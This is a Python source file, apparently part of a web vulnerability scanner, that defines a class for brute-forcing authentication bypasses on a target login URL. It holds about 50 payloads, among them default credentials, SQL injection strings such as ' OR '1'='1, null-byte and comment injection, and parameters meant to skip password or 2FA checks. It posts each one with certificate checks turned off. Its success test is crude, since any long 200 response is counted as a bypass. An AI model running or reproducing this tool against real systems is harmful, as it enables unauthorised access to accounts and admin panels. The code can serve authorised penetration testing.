# auth_bypass.py
import requests
import logging
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AuthBypassTester:
    def __init__(self, target, config):
        self.target = target
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # 50+ Authentication Bypass Payloads
        self.payloads = {
            'default_credentials': [
                {'username': 'admin', 'password': 'admin'},
                {'username': 'admin', 'password': 'password'},
                {'username': 'admin', 'password': '123456'},
                {'username': 'admin', 'password': 'admin123'},
                {'username': 'root', 'password': 'root'},
                {'username': 'root', 'password': 'password'},
                {'username': 'test', 'password': 'test'},
                {'username': 'guest', 'password': 'guest'},
            ],
            
            'empty_password': [
                {'username': 'admin', 'password': ''},
                {'username': 'root', 'password': ''},
                {'username': 'test', 'password': ''},
            ],
            
            'empty_username': [
                {'username': '', 'password': 'admin'},
                {'username': '', 'password': 'password'},
            ],
            
            'both_empty': [
                {'username': '', 'password': ''},
            ],
            
            'sql_injection': [
                {'username': "admin' --", 'password': 'anything'},
                {'username': "admin' #", 'password': 'anything'},
                {'username': "admin'/*", 'password': 'anything'},
                {'username': "' OR '1'='1", 'password': 'anything'},
                {'username': "' OR 1=1--", 'password': 'anything'},
                {'username': "admin' OR '1'='1", 'password': 'anything'},
            ],
            
            'null_byte': [
                {'username': 'admin%00', 'password': 'anything'},
                {'username': 'admin\x00', 'password': 'anything'},
            ],
            
            'case_variation': [
                {'username': 'ADMIN', 'password': 'admin'},
                {'username': 'Admin', 'password': 'admin'},
                {'username': 'aDmIn', 'password': 'admin'},
            ],
            
            'whitespace': [
                {'username': ' admin ', 'password': 'admin'},
                {'username': 'admin ', 'password': 'admin'},
                {'username': ' admin', 'password': 'admin'},
            ],
            
            'encoding_bypass': [
                {'username': 'admin', 'password': ''},
                {'username': '%61%64%6d%69%6e', 'password': 'admin'},
            ],
            
            'unicode': [
                {'username': 'admin\u0000', 'password': 'admin'},
            ],
            
            'comment_injection': [
                {'username': 'admin/*', 'password': ''},
                {'username': 'admin#', 'password': ''},
                {'username': 'admin--', 'password': ''},
            ],
            
            'logical_errors': [
                {'username': 'admin', 'password': 'admin', 'login': '0'},
                {'username': 'admin', 'password': 'admin', 'submit': 'false'},
            ],
            
            'timing_attack': [
                {'username': 'admin', 'password': 'a'},
                {'username': 'admin', 'password': 'ab'},
                {'username': 'admin', 'password': 'abc'},
            ],
            
            'bypass_with_parameters': [
                {'username': 'admin', 'password': 'admin', 'remember': '1'},
                {'username': 'admin', 'password': 'admin', 'auto_login': 'true'},
                {'username': 'admin', 'password': 'admin', 'keep_logged': '1'},
            ],
            
            'header_injection': [
                {'username': 'admin', 'password': 'admin', 'X-Forwarded-For': '127.0.0.1'},
            ],
            
            'no_password_check': [
                {'username': 'admin'},
                {'username': 'admin', 'skip_password': 'true'},
            ],
            
            'bypass_second_factor': [
                {'username': 'admin', 'password': 'admin', '2fa': 'false'},
                {'username': 'admin', 'password': 'admin', 'otp': ''},
            ],
        }
    
    def test_all(self):
        """Test all authentication bypass payloads"""
        findings = []
        total_tests = sum(len(p) for p in self.payloads.values())
        tested = 0
        
        self.logger.info(f"[*] Testing {total_tests} authentication bypass payloads...")
        
        for category, payloads in self.payloads.items():
            for payload in payloads:
                result = self.test_payload(category, payload)
                tested += 1
                
                if result and result['vulnerable']:
                    findings.append(result)
                    self.logger.info(f"[+] AUTH BYPASS VULNERABLE: {category}")
                
                if tested % 10 == 0:
                    print(f"  [{tested}/{total_tests}] Testing Auth...", end='\r')
        
        self.logger.info(f"[*] Auth Bypass Testing Complete!")
        return findings
    
    def test_payload(self, category, payload):
        """Test single auth payload"""
        try:
            response = requests.post(
                self.target,
                data=payload,
                timeout=5,
                verify=False
            )
            
            if self.check_vulnerability(response):
                return {
                    'type': 'Authentication Bypass',
                    'category': category,
                    'payload': str(payload)[:50],
                    'vulnerable': True,
                    'status_code': response.status_code,
                }
        except:
            pass
        
        return None
    
    def check_vulnerability(self, response):
        """Check if auth bypass successful"""
        response_lower = response.text.lower()
        
        # Success indicators
        success_indicators = [
            'dashboard', 'welcome', 'logged in',
            'login successful', 'admin panel',
            'user profile', 'authenticated',
            'home page', 'logout'
        ]
        
        # Failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'denied',
            'unauthorized', '401', '403',
            'login failed', 'wrong credentials'
        ]
        
        if any(success in response_lower for success in success_indicators):
            if not any(fail in response_lower for fail in failure_indicators):
                return True
        
        if response.status_code == 200 and len(response.text) > 1000:
            return True
        
        return False
    
    def count_payloads(self):
        total = sum(len(p) for p in self.payloads.values())
        return total, self.payloads